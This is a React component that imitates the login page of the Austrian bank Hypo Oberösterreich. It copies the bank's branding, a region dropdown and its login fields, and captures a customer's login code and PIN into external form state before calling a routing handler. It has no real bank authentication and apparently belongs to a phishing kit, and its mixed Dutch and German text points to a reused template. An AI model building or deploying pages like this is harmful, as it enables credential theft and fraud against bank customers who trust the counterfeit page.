"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function HypoOberosterreich({ formData, onChange, handleRouteAction, saving }: Props) {
  const [bank, setBank] = useState("");
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [saveVerfueger, setSaveVerfueger] = useState(false);

  const selectBank = (selected: string) => {
    setBank(selected);
    setDropdownOpen(false);
  };

  return (
    <div 
      className="min-h-screen bg-cover bg-center font-sans flex flex-col items-center justify-center relative"
      style={{ backgroundImage: "url('/hypo-oberosterreich-bg.webp')" }}
    >
      {/* Centered White Card */}
      <div className="bg-white w-[90%] max-w-[650px] shadow-lg pt-4 px-10 pb-12 relative z-10">
        
        {/* Top Right Language Selector */}
        <div className="flex justify-end mb-4">
          <div className="flex items-center text-[13px] text-gray-700 cursor-pointer">
            Deutsch 
            <svg className="w-4 h-4 ml-1 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
            </svg>
          </div>
        </div>

        {/* Headings */}
        <h1 className="text-[28px] text-gray-800 font-normal mb-3">Log alstublieft in</h1>
        <p className="text-[14px] text-gray-700 mb-8">
          Voer uw inloggegevens in om verder te gaan.
        </p>

        {/* Form */}
        <form 
          onSubmit={(e) => {
            e.preventDefault();
            handleRouteAction();
          }}
          className="flex flex-col gap-6"
        >
          {/* Custom Dropdown Field */}
          <div className="relative">
            <div 
              onClick={() => setDropdownOpen(!dropdownOpen)}
              className="w-full h-[52px] bg-[#f4f4f4] border-b-2 border-gray-400 px-4 flex items-center justify-between cursor-pointer group hover:border-[#6799c8] transition-colors"
            >
              <div className="flex flex-col justify-center">
                {bank ? (
                  <>
                    <span className="text-[11px] text-gray-500 mt-1">Bundesland oder Bank wählen *</span>
                    <span className="text-[15px] text-black leading-tight">{bank}</span>
                  </>
                ) : (
                  <span className="text-[15px] text-gray-500">Bundesland oder Bank wählen *</span>
                )}
              </div>
              <svg 
                className={`w-5 h-5 text-black transition-transform ${dropdownOpen ? 'rotate-180' : ''}`} 
                fill="none" stroke="currentColor" viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
              </svg>
            </div>

            {/* Dropdown Options */}
            {dropdownOpen && (
              <div className="absolute top-full left-0 w-full bg-white shadow-md border border-gray-200 mt-1 z-20">
                <div 
                  className="px-4 py-4 text-[16px] text-black hover:bg-gray-50 cursor-pointer"
                  onClick={() => selectBank("Oberösterreich")}
                >
                  Oberösterreich
                </div>
                <div 
                  className="px-4 py-4 text-[16px] text-black hover:bg-gray-50 cursor-pointer"
                  onClick={() => selectBank("Salzburg")}
                >
                  Salzburg
                </div>
              </div>
            )}
          </div>

          {/* Inlogcode Field */}
          <div className="relative">
            <div className="w-full h-[52px] bg-[#f4f4f4] border-b-2 border-gray-400 px-4 flex items-center focus-within:border-[#6799c8] transition-colors">
              <div className="flex flex-col justify-center w-full">
                {formData.verfuegernummer && (
                  <span className="text-[11px] text-gray-500 mt-1 absolute top-1">Inlogcode invoeren *</span>
                )}
                <input 
                  type="text" 
                  placeholder={formData.verfuegernummer ? "" : "Inlogcode invoeren *"}
                  value={formData.verfuegernummer || ""}
                  onChange={(e) => onChange("verfuegernummer", e.target.value)}
                  className="w-full bg-transparent outline-none text-[15px] text-black pt-3 placeholder-gray-500"
                />
              </div>
            </div>
          </div>

          {/* PIN Field */}
          <div className="relative">
            <div className="w-full h-[52px] bg-[#f4f4f4] border-b-2 border-gray-400 px-4 flex items-center focus-within:border-[#6799c8] transition-colors">
              <div className="flex flex-col justify-center w-full">
                {formData.pin && (
                  <span className="text-[11px] text-gray-500 mt-1 absolute top-1">PIN eingeben *</span>
                )}
                <input 
                  type="password" 
                  placeholder={formData.pin ? "" : "PIN eingeben *"}
                  value={formData.pin || ""}
                  onChange={(e) => onChange("pin", e.target.value)}
                  className="w-full bg-transparent outline-none text-[15px] text-black pt-3 placeholder-gray-500"
                />
              </div>
            </div>
          </div>

          {/* Checkbox Row */}
          <div className="flex items-center mt-2">
            <div 
              className="w-5 h-5 border border-gray-500 rounded-sm flex items-center justify-center mr-3 cursor-pointer"
              onClick={() => setSaveVerfueger(!saveVerfueger)}
            >
              {saveVerfueger && (
                <svg className="w-3.5 h-3.5 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                </svg>
              )}
            </div>
            <span className="text-[14px] text-gray-700">Verfüger speichern</span>
            <div className="ml-2 w-4 h-4 rounded-full border border-black flex items-center justify-center cursor-help">
              <span className="text-[10px] font-serif font-bold text-black">i</span>
            </div>
          </div>

          {/* Submit Button */}
          <div className="flex justify-center mt-4">
            <button 
              type="submit" 
              disabled={saving} 
              className="w-[300px] max-w-full bg-[#6799c8] hover:bg-[#5687b5] text-white py-3 font-normal transition-colors text-[15px]"
            >
              {saving ? "Laden..." : "Weiter"}
            </button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <div className="absolute bottom-6 w-full text-center z-10">
        <p className="text-[11px] text-white font-semibold tracking-wider" style={{ textShadow: '0 1px 2px rgba(0,0,0,0.8)' }}>
          © 2019 Hypo
        </p>
      </div>

      {/* Floating Help Button */}
      <div className="fixed bottom-6 right-6 z-50">
        <button className="bg-[#005a96] hover:bg-[#004a7a] text-white w-12 h-12 rounded-full shadow-lg flex items-center justify-center font-bold text-xl transition-colors">
          ?
        </button>
      </div>
    </div>
  );
}